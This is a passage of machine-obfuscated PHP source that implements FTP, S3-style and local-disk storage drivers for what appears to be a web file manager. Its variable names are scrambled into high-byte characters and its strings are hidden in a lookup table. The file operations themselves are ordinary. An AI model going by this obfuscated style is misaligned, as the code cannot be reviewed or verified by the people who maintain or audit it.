$config; $this->appCharset = $config[$’‚¨¥[1419]]; $this->systemCharset = $config[$’‚¨¥[1420]]; if (isset($ûñƒÇ¸¨[$’‚¨¥[1421]]) && $ûñƒÇ¸¨[$’‚¨¥[1421]]) { $this->systemCharset = $ûñƒÇ¸¨[$’‚¨¥[1421]]; } } public function iconvApp($¶†´„„) { return $this->iconvTo($¶†´„„, $this->systemCharset, $this->appCharset); } public function iconvSystem($ÜÉ­À‚á) { return $this->iconvTo($ÜÉ­À‚á, $this->appCharset, $this->systemCharset); } public function getPathOuter($ˆùÀ‘ş) { $Ñâ™³‹İ =& $_SERVER[£ğ°ÖØø]; $÷Ø ±î = $this->iconvApp($this->pathBase); $ˆùÀ‘ş = $this->iconvApp($ˆùÀ‘ş); if (substr($÷Ø ±î, 0, 2) == $Ñâ™³‹İ[1393]) { $÷Ø ±î = BASIC_PATH . substr($÷Ø ±î, 2); } if (substr($ˆùÀ‘ş, 0, 2) == $Ñâ™³‹İ[1393]) { $ˆùÀ‘ş = BASIC_PATH . substr($ˆùÀ‘ş, 2); } $÷Ø ±î = KodIO::clear($÷Ø ±î); $ˆùÀ‘ş = KodIO::clear($ˆùÀ‘ş); $ˆùÀ‘ş = substr($ˆùÀ‘ş, strlen($÷Ø ±î)); if (empty($this->pathDriver)) { return $ˆùÀ‘ş; } return $this->pathDriver . $Ñâ™³‹İ[8] . ltrim($ˆùÀ‘ş, $Ñâ™³‹İ[8]); } private function _init($°°ëàÍ = array()) { $ÖœìİÊê =& $_SERVER[£ğ°ÖØø]; if (!function_exists($ÖœìİÊê[1422])) { throw new Exception(LNG($ÖœìİÊê[1423])); } $this->config = $°°ëàÍ; $this->charsetReset($°°ëàÍ); foreach ($°°ëàÍ as $İíŒ±› => $‘Ğ³ÅØÎ) { if (isset($this->{$İíŒ±›})) { $this->{$İíŒ±›} = $‘Ğ³ÅØÎ; } } return $this->_login($°°ëàÍ); } private function _login($Œ“¤¯”™) { $İ¯ŒÑ•ş =& $_SERVER[£ğ°ÖØø]; static $Îó¢¯ğ = array(); $ëıú®ò  = md5(json_encode($Œ“¤¯”™)); if (isset($Îó¢¯ğ[$ëıú®ò ])) { foreach ($Îó¢¯ğ[$ëıú®ò ] as $”Æş´– => $ê‘ ©ßë) { $this->{$”Æş´–} = $ê‘ ©ßë; } return !0; } $‚·¿Éà´ = parse_url(trim($this->server, $İ¯ŒÑ•ş[8])); $this->host = $‚·¿Éà´[$İ¯ŒÑ•ş[208]]; $±åÖ¤ÛÙ = isset($‚·¿Éà´[$İ¯ŒÑ•ş[207]]) && $‚·¿Éà´[$İ¯ŒÑ•ş[207]] == $İ¯ŒÑ•ş[1424] ? !0 : !1; $this->scheme = $±åÖ¤ÛÙ ? $İ¯ŒÑ•ş[1425] : $İ¯ŒÑ•ş[1426]; $this->port = isset($‚·¿Éà´[$İ¯ŒÑ•ş[209]]) ? $‚·¿Éà´[$İ¯ŒÑ•ş[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($İ¯ŒÑ•ş[1427]) . $this->host . $İ¯ŒÑ•ş[4] . $this->port, !0); return !1; } $¥ïÛĞí¢ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$¥ïÛĞí¢) { $this->writeLog(LNG($İ¯ŒÑ•ş[1428]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $šù…ºâ‚ = $this->pasv == $İ¯ŒÑ•ş[91] ? !0 : !1; @ftp_pasv($this->connect, $šù…ºâ‚); $Îó¢¯ğ[$ëıú®ò ] = array($İ¯ŒÑ•ş[1429] => $this->connect, $İ¯ŒÑ•ş[208] => $this->host, $İ¯ŒÑ•ş[207] => $this->scheme, $İ¯ŒÑ•ş[209] => $this->port); return $¥ïÛĞí¢; } private function _isconn($ÑÖãúÖ = true) { if (is_resource($this->connect)) { return !0; } if (!$ÑÖãúÖ) { return !1; } return $this->_login($this->config); } public function mkfile($­¯îŠîŞ, $ŞûÏÛ´¦ = '', $š±àñÄè = REPEAT_RENAME) { if ($this->setContent($­¯îŠîŞ, $ŞûÏÛ´¦)) { return $this->getPathOuter($­¯îŠîŞ); } $this->writeLog(LNG($_SERVER[£ğ°ÖØø][1430]), !0); return !1; } public function mkdir($½šˆäÙ†, $àÉï¦ò§ = REPEAT_SKIP) { $ñ¤°¿Ä =& $_SERVER[£ğ°ÖØø]; if (!$½šˆäÙ† || $½šˆäÙ† == $ñ¤°¿Ä[8]) { return !0; } if (!$this->_isconn()) { return !1; } $½šˆäÙ† = $this->iconvSystem($½šˆäÙ†); if ($this->_isFolder($½šˆäÙ†) || @ftp_mkdir($this->connect, $½šˆäÙ†)) { return $this->getPathOuter($½šˆäÙ†); } if (!$this->mkdir($this->pathFather($½šˆäÙ†))) { return !1; } if ($½šˆäÙ† = @ftp_mkdir($this->connect, $½šˆäÙ†)) { return $this->getPathOuter($½šˆäÙ†); } $this->writeLog(__FUNCTION__ . $ñ¤°¿Ä[1431], !0); return !1; } public function copyFile($å‘ºÍ±¶, $éœ˜ÏÜÂ) { if (!$this->_isconn()) { return !1; } $œë«ŸŠà = $this->pathThis($this->iconvSystem($å‘ºÍ±¶)); $µ¦îÅŒñ = $this->tempFile($œë«ŸŠà); $®±›¥éÕ = $this->iconvApp($µ¦îÅŒñ); $this->download($å‘ºÍ±¶, $®±›¥éÕ); $³Ÿ¿÷Èè = $this->upload($éœ˜ÏÜÂ, $®±›¥éÕ); $this->tempFileRemve($µ¦îÅŒñ); return $³Ÿ¿÷Èè; } public function moveFile($Ÿ¹¹İÆ, $¦­ŞİÓñ) { if (!$this->_isconn()) { return !1; } $Ÿ¹¹İÆ = $this->iconvSystem($Ÿ¹¹İÆ); $¦­ŞİÓñ = $this->iconvSystem($¦­ŞİÓñ); $ÜÊ†ñ‚‹ = @ftp_rename($this->connect, $Ÿ¹¹İÆ, $¦­ŞİÓñ); if (!$ÜÊ†ñ‚‹) { $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][1431], !0); return !1; } return $this->getPathOuter($¦­ŞİÓñ); } public function delFile($¸àëœ–) { if (!$this->_isconn()) { return !1; } $¸àëœ– = $this->iconvSystem($¸àëœ–); $Ü¼Îáïá = @ftp_delete($this->connect, $¸àëœ–); if (!$Ü¼Îáïá) { $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][1431], !0); } return $Ü¼Îáïá; } public function delFolder($±º¡¯ãç) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $°—°Œ‹ = $¾õÏÜ¶â = array(); $this->fileList($±º¡¯ãç, $°—°Œ‹, $¾õÏÜ¶â, !0); $this->listItemCache = !0; foreach ($¾õÏÜ¶â as $×¢´™‡») { $—âäø±À = $this->iconvSystem($×¢´™‡»[$_SERVER[£ğ°ÖØø][32]]); $Ì‰«³‚ö = @ftp_delete($this->connect, $—âäø±À); if (!$Ì‰«³‚ö) { return !1; } } foreach ($°—°Œ‹ as $—âäø±À) { $—âäø±À = $this->iconvSystem($—âäø±À); $Ì‰«³‚ö = @ftp_rmdir($this->connect, $—âäø±À); if (!$Ì‰«³‚ö) { return !1; } } $±º¡¯ãç = $this->iconvSystem($±º¡¯ãç); return @ftp_rmdir($this->connect, $±º¡¯ãç); } public function rename($’şí€Å, $øŞØœú—) { $ğò¹îÆœ =& $_SERVER[£ğ°ÖØø]; if (!$this->_isconn()) { return !1; } $¨™©×Ûç = $this->fileNameAuto($this->pathFather($’şí€Å), $øŞØœú—); $¨™©×Ûç = $this->iconvSystem($¨™©×Ûç); $’şí€Å = $this->iconvSystem($’şí€Å); $©•ãö°Å = $this->pathFather($’şí€Å); $Ÿê³Õ³ë = rtrim($©•ãö°Å, $ğò¹îÆœ[8]) . $ğò¹îÆœ[8] . $¨™©×Ûç; $ûü‹×²Í = @ftp_rename($this->connect, $’şí€Å, $Ÿê³Õ³ë); if (!$ûü‹×²Í) { $this->writeLog(__FUNCTION__ . $ğò¹îÆœ[1431], !0); return !1; } $Ÿê³Õ³ë = $this->iconvApp($Ÿê³Õ³ë); return $this->getPathOuter($Ÿê³Õ³ë); } private function folderInfo($Å­Ú‘Í, $õ‘¥¶åÍ = false) { $­Ñø°ìÊ =& $_SERVER[£ğ°ÖØø]; $ß¤‘µ÷Ë = array($­Ñø°ìÊ[32] => $this->pathThis($Å­Ú‘Í), $­Ñø°ìÊ[87] => $this->getPathOuter($­Ñø°ìÊ[8] . $Å­Ú‘Í), $­Ñø°ìÊ[33] => $­Ñø°ìÊ[78]); if ($õ‘¥¶åÍ) { return $ß¤‘µ÷Ë; } $ß¤‘µ÷Ë[$­Ñø°ìÊ[231]] = $ß¤‘µ÷Ë[$­Ñø°ìÊ[88]] = 0; $ß¤‘µ÷Ë[$­Ñø°ìÊ[232]] = $ß¤‘µ÷Ë[$­Ñø°ìÊ[233]] = !0; return $ß¤‘µ÷Ë; } private function fileInfo($§õ¿€Æ², $üıæîÊ = false, $ÙÑÕˆ¤ã = array()) { $É¼’ÌÂÑ =& $_SERVER[£ğ°ÖØø]; $Ì¦İôÊ± = array($É¼’ÌÂÑ[32] => $this->pathThis($§õ¿€Æ²), $É¼’ÌÂÑ[87] => $this->getPathOuter($É¼’ÌÂÑ[8] . $§õ¿€Æ²), $É¼’ÌÂÑ[33] => $É¼’ÌÂÑ[230], $É¼’ÌÂÑ[79] => isset($ÙÑÕˆ¤ã[$É¼’ÌÂÑ[79]]) ? $ÙÑÕˆ¤ã[$É¼’ÌÂÑ[79]] : 0, $É¼’ÌÂÑ[169] => $this->ext($§õ¿€Æ²)); if ($üıæîÊ) { return $Ì¦İôÊ±; } $Ì¦İôÊ±[$É¼’ÌÂÑ[231]] = $Ì¦İôÊ±[$É¼’ÌÂÑ[88]] = 0; $Ì¦İôÊ±[$É¼’ÌÂÑ[232]] = $Ì¦İôÊ±[$É¼’ÌÂÑ[233]] = !0; $ó†óâğğ = $this->iconvSystem($§õ¿€Æ²); $Ì¦İôÊ±[$É¼’ÌÂÑ[88]] = @ftp_mdtm($this->connect, $ó†óâğğ); if (empty($ÙÑÕˆ¤ã)) { $ÙÑÕˆ¤ã = $this->objectMeta($§õ¿€Æ²); if (!$ÙÑÕˆ¤ã) { return $Ì¦İôÊ±; } } $Ì¦İôÊ±[$É¼’ÌÂÑ[79]] = $ÙÑÕˆ¤ã[$É¼’ÌÂÑ[79]]; return $Ì¦İôÊ±; } public function size($ÈŞàÆ²Æ) { $¼´²İ‡ = $this->objectMeta($ÈŞàÆ²Æ); return $¼´²İ‡ ? $¼´²İ‡[$_SERVER[£ğ°ÖØø][79]] : 0; } public function info($İ³»¾å) { if ($this->isFile($İ³»¾å)) { return $this->fileInfo($İ³»¾å, 0); } else { if ($this->isFolder($İ³»¾å)) { return $this->folderInfo($İ³»¾å); } } return !1; } private function fileList($Å±Ò§ƒÍ, &$¿êêÀÕì, &$ƒ©²ñ°†, $ğèƒ÷şå = false) { $”ç½ª“ =& $_SERVER[£ğ°ÖØø]; $Å±Ò§ƒÍ = $this->iconvSystem($Å±Ò§ƒÍ); if (!$this->isFolder($Å±Ò§ƒÍ)) { return !1; } @ftp_chdir($this->connect, $”ç½ª“[8]); $Å±Ò§ƒÍ = rtrim($Å±Ò§ƒÍ, $”ç½ª“[8]) . $”ç½ª“[8]; check_abort(); $š©¼„éÌ = @ftp_rawlist($this->connect, $Å±Ò§ƒÍ); if (!$š©¼„éÌ) { $š©¼„éÌ = array(); } $§‚”ñ®é = array($”ç½ª“[10] => 1, $”ç½ª“[1346] => 1); foreach ($š©¼„éÌ as $ùì‰úíÎ) { $¥ø¡ı£ = $this->_listItem($ùì‰úíÎ); if ($¥ø¡ı£[0] == $”ç½ª“[822]) { continue; } $Çìê·‚É = $¥ø¡ı£[8]; if (empty($Çìê·‚É) && $Çìê·‚É !== $”ç½ª“[228] || isset($§‚”ñ®é[$Çìê·‚É])) { continue; } $Çìê·‚É = $this->iconvApp($Å±Ò§ƒÍ . ltrim($Çìê·‚É, $”ç½ª“[8])); $ñ¬ğÍûô = array($”ç½ª“[32] => $Çìê·‚É, $”ç½ª“[33] => $”ç½ª“[230], $”ç½ª“[79] => $¥ø¡ı£[4]); if (substr($ùì‰úíÎ, 0, 1) == $”ç½ª“[1432]) { $ñ¬ğÍûô[$”ç½ª“[33]] = $”ç½ª“[78]; $ñ¬ğÍûô[$”ç½ª“[79]] = 0; } $ÚÔ¬Ïèô = $ñ¬ğÍûô[$”ç½ª“[33]] == $”ç½ª“[78] ? !0 : !1; $this->cacheMethodInfoSet($Çìê·‚É, $ÚÔ¬Ïèô, $ñ¬ğÍûô); if ($ÚÔ¬Ïèô) { $¿êêÀÕì[] = $Çìê·‚É; if ($ğèƒ÷şå) { $this->fileList($Çìê·‚É, $¿êêÀÕì, $ƒ©²ñ°†, $ğèƒ÷şå); } continue; } $ƒ©²ñ°†[] = $ñ¬ğÍûô; } $this->cacheMethodInfoSet($Å±Ò§ƒÍ, !0); } private function _listItem($ÆÈ¦ï ¿) { if (empty($ÆÈ¦ï ¿)) { return array(); } $É¸œŒĞÙ = preg_split($_SERVER[£ğ°ÖØø][1433], $ÆÈ¦ï ¿); if (count($É¸œŒĞÙ) <= 9) { return $É¸œŒĞÙ; } $É¸œŒĞÙ[8] = trim(substr($ÆÈ¦ï ¿, strpos($ÆÈ¦ï ¿, $É¸œŒĞÙ[7]) + strlen($É¸œŒĞÙ[7]))); return array_splice($É¸œŒĞÙ, 0, 9); } public function listPath($œúú¥ÃÚ, $¾óİÅú¤ = false) { $¸ÔÔ¸Ÿ© =& $_SERVER[£ğ°ÖØø]; if (!$this->_isconn()) { return !1; } $‰ïåßĞë = $¬‡¼ãà¹ = array(); $this->fileList($œúú¥ÃÚ, $‰ïåßĞë, $¬‡¼ãà¹); foreach ($‰ïåßĞë as $¥…—Èï£ => $ÅêÄª£Ã) { $‰ïåßĞë[$¥…—Èï£] = $this->folderInfo($ÅêÄª£Ã, $¾óİÅú¤); } foreach ($¬‡¼ãà¹ as $¥…—Èï£ => $ÅêÄª£Ã) { $¬‡¼ãà¹[$¥…—Èï£] = $this->fileInfo($ÅêÄª£Ã[$¸ÔÔ¸Ÿ©[32]], $¾óİÅú¤, $ÅêÄª£Ã); } return array($¸ÔÔ¸Ÿ©[85] => $‰ïåßĞë, $¸ÔÔ¸Ÿ©[86] => $¬‡¼ãà¹); } public function has($€…æ‘§è, $ø°Š†Â = false, $¥èÉ¼— = true) { $ÇîĞÄûï =& $_SERVER[£ğ°ÖØø]; $øú«—¤˜ = $Ùöº‹Ö = array(); $ôœÒ†•å = $ø°Š†Â ? !0 : !1; $this->fileList($€…æ‘§è, $øú«—¤˜, $Ùöº‹Ö, $ôœÒ†•å); if ($ø°Š†Â) { return array($ÇîĞÄûï[239] => count($Ùöº‹Ö), $ÇîĞÄûï[240] => count($øú«—¤˜)); } if ($¥èÉ¼—) { if (count($Ùöº‹Ö)) { return !0; } } else { if (count($øú«—¤˜)) { return !0; } } return !1; } public function listAll($¸ø™‡ÊÂ) { $àÁÇìóŠ =& $_SERVER[£ğ°ÖØø]; if (!$this->_isconn()) { return !1; } $î©á = $ıŠ‘ª»× = array(); $this->fileList($¸ø™‡ÊÂ, $î©á, $ıŠ‘ª»×, !0); $÷Û«Ã œ = array_to_keyvalue($ıŠ‘ª»×, $àÁÇìóŠ[32]); foreach ($î©á as $»„õÑìœ) { if (is_string($»„õÑìœ)) { $÷Û«Ã œ[$»„õÑìœ] = array($àÁÇìóŠ[79] => 0); } } return $this->listAllFiles($¸ø™‡ÊÂ, $÷Û«Ã œ); } public function getContent($ö³çŒâ) { if (!$this->_isconn()) { return !1; } $ö³çŒâ = $this->iconvSystem($ö³çŒâ); return $this->fileSubstr($ö³çŒâ); } public function setContent($Ï¿Âˆ , $ŞÄ÷š† = '') { if (!$this->_isconn()) { return !1; } $¸œ»ê¤° = $this->pathThis($this->iconvSystem($Ï¿Âˆ )); $…¦ÅÄß¥ = $this->tempFile($¸œ»ê¤°); file_put_contents($…¦ÅÄß¥, $ŞÄ÷š†); $€“ÀäÓ = $this->upload($Ï¿Âˆ , $this->iconvApp($…¦ÅÄß¥)); $this->tempFileRemve($…¦ÅÄß¥); return $€“ÀäÓ; } public function fileSubstr($»‚€ñ„Ú, $ˆîïÜÃğ = 0, $®ªİ”Öò = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($»‚€ñ„Ú, $ˆîïÜÃğ, $®ªİ”Öò); } private function ftpRequest($Å˜ïËóÅ, $ñÜ×Ê¬ = 0, $ŸÖ’¹êå = false) { $Å˜ïËóÅ = $this->iconvSystem($Å˜ïËóÅ); $ÓÏ‡¸›Ø = $this->scheme . $this->host . $_SERVER[£ğ°ÖØø][4] . $this->port; $ËøË²ÚÇ = curl_init(); curl_setopt($ËøË²ÚÇ, CURLOPT_URL, $ÓÏ‡¸›Ø . $this->pathEncode($Å˜ïËóÅ)); curl_setopt($ËøË²ÚÇ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ŸÖ’¹êå) { $™õæ“µ = $ñÜ×Ê¬ + $ŸÖ’¹êå - 1; curl_setopt($ËøË²ÚÇ, CURLOPT_RANGE, "{$ñÜ×Ê¬}\x2d{$™õæ“µ}"); } curl_setopt($ËøË²ÚÇ, CURLOPT_RETURNTRANSFER, 1); $ÈûëØ´ = curl_exec($ËøË²ÚÇ); curl_close($ËøË²ÚÇ); return $ÈûëØ´; } public function upload($‡¯†”úÌ, $µ¬Ú¡Üë, $ÛºªßúÑ = false, $›¼ÀˆªÉ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($‡¯†”úÌ))) { return !1; } $‡¯†”úÌ = $this->iconvSystem($‡¯†”úÌ); $µ¬Ú¡Üë = $this->iconvSystem($µ¬Ú¡Üë); $â‘õÃÌÂ = ftp_nb_put($this->connect, $‡¯†”úÌ, $µ¬Ú¡Üë, FTP_BINARY); while ($â‘õÃÌÂ == FTP_MOREDATA) { $â‘õÃÌÂ = ftp_nb_continue($this->connect); } if ($â‘õÃÌÂ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][1431], !0); return !1; } return $this->getPathOuter($‡¯†”úÌ); } public function download($‰ÎœÊ™ê, $Å†¬œÙé = '') { if (!$this->_isconn()) { return !1; } $Õ‚·ÇŒ = $this->pathFather($Å†¬œÙé); if (!IO::mkdir($Õ‚·ÇŒ)) { return !1; } $‰ÎœÊ™ê = $this->iconvSystem($‰ÎœÊ™ê); $Å†¬œÙé = $this->iconvSystem($Å†¬œÙé); $ãæÛ”µ = ftp_nb_get($this->connect, $Å†¬œÙé, $‰ÎœÊ™ê, FTP_BINARY); while ($ãæÛ”µ == FTP_MOREDATA) { $ãæÛ”µ = ftp_nb_continue($this->connect); } if ($ãæÛ”µ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][1431], !0); return !1; } return $this->iconvApp($Å†¬œÙé); } public function exist($Üà¨ó—Á) { return $this->isFile($Üà¨ó—Á) || $this->isFolder($Üà¨ó—Á); } public function isFile($¾¼ËäÈ†) { return !$this->isFolder($¾¼ËäÈ†) && $this->objectMeta($¾¼ËäÈ†); } public function isFolder($Ú†³Œ™) { return $this->cacheMethod($_SERVER[£ğ°ÖØø][179], $Ú†³Œ™); } protected function objectMeta($ñğ…Îû) { return $this->cacheMethod($_SERVER[£ğ°ÖØø][181], $ñğ…Îû); } protected function _objectMeta($ûñ„Éø½) { $ıÓ–óëâ =& $_SERVER[£ğ°ÖØø]; if ($ûñ„Éø½ == $ıÓ–óëâ[12] || $ûñ„Éø½ == $ıÓ–óëâ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ûñ„Éø½ = $this->iconvSystem($ûñ„Éø½); $‚£üïïâ = array($ıÓ–óëâ[32] => $this->iconvApp($ûñ„Éø½), $ıÓ–óëâ[33] => $ıÓ–óëâ[230], $ıÓ–óëâ[79] => 0); @ftp_chdir($this->connect, $ıÓ–óëâ[8]); $Ñ‚£Œ®• = @ftp_size($this->connect, $ûñ„Éø½); if ($Ñ‚£Œ®• != -1) { $‚£üïïâ[$ıÓ–óëâ[79]] = $Ñ‚£Œ®•; } else { $¥â™Öä = @ftp_chdir($this->connect, $ûñ„Éø½); if (!$¥â™Öä) { return !1; } $‚£üïïâ[$ıÓ–óëâ[33]] = $ıÓ–óëâ[78]; } return $‚£üïïâ; } protected function _isFolder($® áÕèü) { $½ñùËÖŒ =& $_SERVER[£ğ°ÖØø]; if ($® áÕèü == $½ñùËÖŒ[12] || $® áÕèü == $½ñùËÖŒ[8]) { return !0; } $³ß÷Š‚ = $this->_objectMeta($® áÕèü); return isset($³ß÷Š‚[$½ñùËÖŒ[33]]) && $³ß÷Š‚[$½ñùËÖŒ[33]] == $½ñùËÖŒ[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($İ€Õ•Ø) { parent::__construct($İ€Õ•Ø); $this->setSignVersion($_SERVER[£ğ°ÖØø][247]); } public function uploadLink($Ş¼ù‚¾Õ, $™†ØÅ…­ = 0) { $ ÜîÍ¯ø =& $_SERVER[£ğ°ÖØø]; if ($this->isUploadServer()) { return; } $è®»½½ı = $this->getType(); if (!in_array($è®»½½ı, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $§õÃâ = (!$™†ØÅ…­ ? 1 : ceil($™†ØÅ…­ / pow(1024, 3))) * 3600 * 4; $åäğ¬¨œ = $this->multiUploadFormData($Ş¼ù‚¾Õ, $§õÃâ); if ($åäğ¬¨œ) { $åäğ¬¨œ[$ ÜîÍ¯ø[97]] = $Ş¼ù‚¾Õ; $åäğ¬¨œ[$ ÜîÍ¯ø[98]] = $è®»½½ı; } return $åäğ¬¨œ; } public function fileOutImage($™¯­‚³, $ü¯ê¾§ = 250) { if ($this->size($™¯­‚³) > 1024 * 1024 * 25) { return $this->fileOutImageServer($™¯­‚³, $ü¯ê¾§); } $­ø‡£Ş = $this->link($™¯­‚³); $­ø‡£Ş .= $_SERVER[£ğ°ÖØø][1434] . $ü¯ê¾§; $this->fileOutLink($­ø‡£Ş); } public function fileOutLink($–ŠáµÊ¦) { $±ÀÊø•“ =& $_SERVER[£ğ°ÖØø]; if (substr($–ŠáµÊ¦, 0, 7) == $±ÀÊø•“[313]) { $–ŠáµÊ¦ = $±ÀÊø•“[314] . substr($–ŠáµÊ¦, 7); } header($±ÀÊø•“[175] . $–ŠáµÊ¦); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($­ù™·ÌÖ) { if (substr($­ù™·ÌÖ, 0, 2) == $_SERVER[£ğ°ÖØø][1393]) { $­ù™·ÌÖ = BASIC_PATH . substr($­ù™·ÌÖ, 2); } return $­ù™·ÌÖ; } public function iconvApp($‹˜ü½•Ö) { $¾ô—ó =& $_SERVER[£ğ°ÖØø]; global $config; return $this->iconvTo($‹˜ü½•Ö, $config[$¾ô—ó[1420]], $config[$¾ô—ó[1419]]); } public function iconvSystem($¨Œé”òË) { $æˆçŸõÁ =& $_SERVER[£ğ°ÖØø]; global $config; return $this->iconvTo($¨Œé”òË, $config[$æˆçŸõÁ[1419]], $config[$æˆçŸõÁ[1420]]); } public function getPathOuter($ö÷ŞÆ°) { $ïéÚÊˆ¼ =& $_SERVER[£ğ°ÖØø]; $ã™›Õ¢“ = $this->iconvApp($this->pathBase); $ö÷ŞÆ° = $this->iconvApp($ö÷ŞÆ°); if (substr($ã™›Õ¢“, 0, 2) == $ïéÚÊˆ¼[1393]) { $ã™›Õ¢“ = BASIC_PATH . substr($ã™›Õ¢“, 2); } if (substr($ö÷ŞÆ°, 0, 2) == $ïéÚÊˆ¼[1393]) { $ö÷ŞÆ° = BASIC_PATH . substr($ö÷ŞÆ°, 2); } $ã™›Õ¢“ = KodIO::clear($ã™›Õ¢“); $ö÷ŞÆ° = KodIO::clear($ö÷ŞÆ°); $ö÷ŞÆ° = substr($ö÷ŞÆ°, strlen($ã™›Õ¢“)); if (empty($this->pathDriver)) { return $ö÷ŞÆ°; } return $this->pathDriver . $ïéÚÊˆ¼[8] . ltrim($ö÷ŞÆ°, $ïéÚÊˆ¼[8]); } public function mkfile($¨€ŸŸİ, $ÑÆÂ¥õ® = '', $™ÖÇï¤ = REPEAT_RENAME) { $¨€ŸŸİ = $this->iconvSystem($¨€ŸŸİ); @touch($¨€ŸŸİ); if ($ÑÆÂ¥õ®) { file_put_contents($¨€ŸŸİ, $ÑÆÂ¥õ®); } @chmod($¨€ŸŸİ, $this->pathAuth); if (is_file($¨€ŸŸİ)) { return $this->getPathOuter($¨€ŸŸİ); } $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][1431], !0); return !1; } public function mkdir($Ò€âÇÅª, $ûƒ•ÜÂì = REPEAT_SKIP) { $Ò€âÇÅª = $this->iconvSystem($Ò€âÇÅª); if (is_dir($Ò€âÇÅª)) { return $this->getPathOuter($Ò€âÇÅª); } @mkdir($Ò€âÇÅª, $this->pathAuth, !0); @chmod($Ò€âÇÅª, $this->pathAuth); if (is_dir($Ò€âÇÅª)) { return $this->getPathOuter($Ò€âÇÅª); } $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][1431], !0); return !1; } public function copyFile($ñÛ²«¾, $¨§Ç‚ˆƒ) { $this->mkdir($this->pathFather($¨§Ç‚ˆƒ)); $ñÛ²«¾ = $this->iconvSystem($ñÛ²«¾); $¨§Ç‚ˆƒ = $this->iconvSystem($¨§Ç‚ˆƒ); $üÍÀìƒ = copy_64($ñÛ²«¾, $¨§Ç‚ˆƒ); @chmod($¨§Ç‚ˆƒ, $this->pathAuth); if ($üÍÀìƒ) { return $this->getPathOuter($¨§Ç‚ˆƒ); } $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][1431], !0); return !1; } public function moveFile($µ©¢¦ßá, $©Ö©Ôæú) { $this->mkdir($this->pathFather($©Ö©Ôæú)); $µ©¢¦ßá = $this->iconvSystem($µ©¢¦ßá); $©Ö©Ôæú = $this->iconvSystem($©Ö©Ôæú); $¬‘Ûï±ˆ = intval(@rename($µ©¢¦ßá, $©Ö©Ôæú)); if (!$¬‘Ûï±ˆ) { if ($¬‘Ûï±ˆ = intval(@copy_64($µ©¢¦ßá, $©Ö©Ôæú))) { @unlink($µ©¢¦ßá); } } @chmod($©Ö©Ôæú, $this->pathAuth); if ($¬‘Ûï±ˆ) { return $this->getPathOuter($©Ö©Ôæú); } $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][1431], !0); return !1; } public function movePath($¼ÈÂß˜…, $İ¨Ê¥»ˆ, $§éìÔ÷Ÿ = false) { $ó›¯˜É =& $_SERVER[£ğ°ÖØø]; $¼ÈÂß˜… = $this->iconvSystem($¼ÈÂß˜…); $İ¨Ê¥»ˆ = $this->iconvSystem($İ¨Ê¥»ˆ); $·¨úı©Ô = rtrim($İ¨Ê¥»ˆ, $ó›¯˜É[8]) . $ó›¯˜É[8] . ($§éìÔ÷Ÿ ? $§éìÔ÷Ÿ : get_path_this($¼ÈÂß˜…)); if (file_exists($·¨úı©Ô)) { return !1; } $©úÂ «Ö = intval(@rename($¼ÈÂß˜…, $·¨úı©Ô)); $©úÂ «Ö = file_exists($·¨úı©Ô); if ($©úÂ «Ö) { return $this->getPathOuter($·¨úı©Ô); } $this->writeLog(__FUNCTION__ . $ó›¯˜É[1431], !0); return !1; } public function delFile($À£²óÑà) { $À£²óÑà = $this->iconvSystem($À£²óÑà); if (!@unlink($À£²óÑà)) { @chmod($À£²óÑà, $this->pathAuth); if (@unlink($À£²óÑà)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][1431], !0); return !1; } return !0; } public function delFolder($Í‰òÍ•é) { $õŞıøíù =& $_SERVER[£ğ°ÖØø]; $Í‰òÍ•é = $this->iconvSystem($Í‰òÍ•é); if (!is_dir($Í‰òÍ•é)) { return !0; } if (!($ÑŠ¸ªğ• = opendir($Í‰òÍ•é))) { return !1; } while (($ÜÂó°å„ = readdir($ÑŠ¸ªğ•)) !== !1) { if ($ÜÂó°å„ == $õŞıøíù[10] || $ÜÂó°å„ == $õŞıøíù[1346]) { continue; } $ÅÂ‡Øè = $Í‰òÍ•é . $õŞıøíù[8] . $ÜÂó°å„; if (is_file($ÅÂ‡Øè) || is_link($ÅÂ‡Øè)) { if (!unlink($ÅÂ‡Øè)) { chmod($ÅÂ‡Øè, $this->pathAuth); if (!unlink($ÅÂ‡Øè)) { return !1; } } } else { if (is_dir($ÅÂ‡Øè)) { chmod($ÅÂ‡Øè, $this->pathAuth); $ÅÂ‡Øè = $this->iconvApp($ÅÂ‡Øè); if (!$this->delFolder($ÅÂ‡Øè)) { return !1; } } } } closedir($ÑŠ¸ªğ•); return rmdir($Í‰òÍ•é); } public function rename($å¼ÖÅç», $Àõè½) { $”¶å‡ÃŠ =& $_SERVER[£ğ°ÖØø]; $ƒ¶ÅÃ¦ñ = $this->fileNameAuto($this->pathFather($å¼ÖÅç»), $Àõè½); $ƒ¶ÅÃ¦ñ = $this->iconvSystem($ƒ¶ÅÃ¦ñ); $å¼ÖÅç» = $this->iconvSystem($å¼ÖÅç»); $²è’ÜÉå = $this->pathFather($å¼ÖÅç»); $³Ÿå’Ôä = rtrim($²è’ÜÉå, $”¶å‡ÃŠ[8]) . $”¶å‡ÃŠ[8] . $ƒ¶ÅÃ¦ñ; $…õú…šñ = @rename($å¼ÖÅç», $³Ÿå’Ôä); $³Ÿå’Ôä = 